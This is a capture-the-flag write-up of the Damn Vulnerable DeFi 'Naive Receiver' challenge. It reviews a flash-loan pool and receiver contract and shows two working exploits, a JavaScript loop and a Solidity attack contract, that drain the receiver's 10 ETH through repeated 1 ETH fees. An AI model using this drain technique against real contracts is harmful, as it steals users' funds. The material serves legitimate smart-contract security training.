## 1) Challenge

> <cite>There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. </cite>
> <cite>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</cite>
> <cite>Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;) </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/2.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

Like in the previous [challenge](DamnVulnerableDeFi_01_unstoppable.md), let's start by reviewing how flash loans are provided. 

The function responsible for offering flash loans is `flashLoan`, defined in the `NaiveReceiverLenderPool` contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/naive-receiver/NaiveReceiverLenderPool.sol#L21-L41)):

```solidity

contract NaiveReceiverLenderPool is ReentrancyGuard {

    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive () external payable {}
}

```

The `flashLoan` function:
- prevents reentrancy by using the `nonReentrant` modifier from [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
- checks if the ETH balance of the contract is greater or equal to the amount we want to borrow (line `24`)
- checks if the borrower is a contract (line `27`)
- calls the `receiveFlashLoan` function of the borrower contract (line `29`)
- checks if we paid back the loan (line `38`)

The pool starts with `1000 ETH` (challenge [setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/naive-receiver/naive-receiver.challenge.js#L21)), while the `FlashLoanReceiver` contract (borrower) starts with `10 ETH` balance (challenge [setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/naive-receiver/naive-receiver.challenge.js#L27)).

Important things to notice:
- **anyone can call this function**
- **there are no checks on the borrow amount** (so it can also be `0`)

To transfer ETH, the pool contract uses `functionCallWithValue` (line `29`) from `Address.sol` library (doc [here](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-)). It sends the `borrowAmount` to the borrower and calls the payable `receiveEther(uint256)` function, exposed by the borrower, with `1 ETH` amount value (the fixed expensive fee).

The `receivedEther` function from `FlashLoanReceiver`([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/naive-receiver/FlashLoanReceiver.sol#L21-L32)):

- checks if the sender is the pool (line `22`), so it means the pool contract can only call it
- computes the amount to be paid back that is the amount borrowed plus the (expensive) fee, that in this case is `1 ETH`
- checks if the balance of the contract is greater or equal to the amount to be paid back
- calls `_executeActionDuringFlashLoan` (that does nothing)
- finally, it returns the amount borrowed plus the fees to the pool (line `31`)

```solidity

contract FlashLoanReceiver {
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;

        require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
        
        _executeActionDuringFlashLoan();
        
        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }

    // Internal function where the funds received are used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive () external payable {}
}

```


After calling `receiveEther`, the `borrower` has to pay back the flash loan plus an expensive fee of `1 ETH`.

#### Who can call the `flashLoan` function ?

As we have seen before, `flashLoan` can be called by anyone by providing a borrower contract address that implements the `receiveEther` function.

#### Who can call the `receiveEther` function of a target contract?

Only the pool can call `receiveEther` since there is a check at line `22`.

However, by providing a borrower address, anyone can call the `flashLoan` function. It means that we (as an attacker) can indirectly call `receiveEther` of a borrower contract because `receiveEther` only checks the `msg.sender` but does not check who called `flashLoan`.

#### What happens when `flashLoan` function is called ?

Every time the `flashLoan` function is called, the borrower has to pay `1 ETH` fee.

Let's see an example with the following values (I'm using the challenge code provided):
- `borrower` is set to the `receiver.address`
- `borrowAmount` is set to `0` (it can be any value `<= 1000 ETH`)

```javascript
    it('Exploit', async function () {
        await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0')); 
    }
```


When calling `functionCallWithValue`, the `borrowAmount`, that in our example is `0`, is sent to the borrower. Since `receiveEther` is a payable function, the borrower's balance is updated with the amount received (that in our example is `0` - so it does not change).

Inside `receivedEther`, the value of `amountToBeRepaid` (line `24`) will be equal to `0 ETH + 1 ETH = 1 ETH` and thus the condition `require(address(this).balance >= amountToBeRepaid)` will be `true` since the receiver balance is `10 ETH` and the amount to be repaid is `1 ETH`.
Finally, `1 ETH` is sent back to the pool, decreasing the borrower balance by `1 ETH`.
So, after calling `receiveEther`, the receiver's balance is decreased by `1 ETH` (the fee applied by the pool).

If we call `flashLoan` another time with the same input, the borrower's balance will be `9 ETH`, so the condition `require(address(this).balance >= amountToBeRepaid)` will still be `true` (`9 >= 1`) and it will be decreased by `1 ETH`.

So, executing the function `10` times will drain the borrower's balance.


## 3) Solution

There are multiple ways to solve this challenge.

### 3.1) Solution 1: multiple transactions

We can call `flashLoan` `10` times in a loop and drain all the borrower's balance.:

```javascript
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        let balance = ethers.utils.formatEther(await ethers.provider.getBalance(this.receiver.address));
        while (balance > 0){
            console.log(`Borrower balance: ${balance}`);
            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
            balance = ethers.utils.formatEther(await ethers.provider.getBalance(this.receiver.address));
        }

        console.log(`Borrower balance: ${balance}`);
    });
```

Output:
```

Borrower balance: 10.0
Borrower balance: 9.0
Borrower balance: 8.0
Borrower balance: 7.0
Borrower balance: 6.0
Borrower balance: 5.0
Borrower balance: 4.0
Borrower balance: 3.0
Borrower balance: 2.0
Borrower balance: 1.0
Borrower balance: 0.0

```


However, with the code above, every time we call `flashLoan`, this will be executed in a single transaction, so we need to perform `10` transactions to solve the challenge.

### 3.2) Solution 2: single transaction

To optimize the number of transactions, we can implement the same logic in a contract and then call the function only once.

`AttackNaiveReceiver.sol`:
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

/**
 * @title AttackNaiveReceiver
 */
contract AttackNaiveReceiver {

    INaiveReceiverLenderPool lenderPool;
    
    constructor(address _pool) {
        lenderPool = INaiveReceiverLenderPool(_pool);
    }

    function run(address _borrower) public {
        
        while(address(_borrower).balance > 0){
            lenderPool.flashLoan(_borrower, 0);
        }

    }

}

```

`naive-receiver.challenge.js`:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attack = await (await ethers.getContractFactory('AttackNaiveReceiver', attacker)).deploy(this.pool.address);
        await attack.run(this.receiver.address);

    });

```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/naive-receiver/naive-receiver.challenge.js) and [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackNaiveReceiver.sol).


## 4) References

- [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)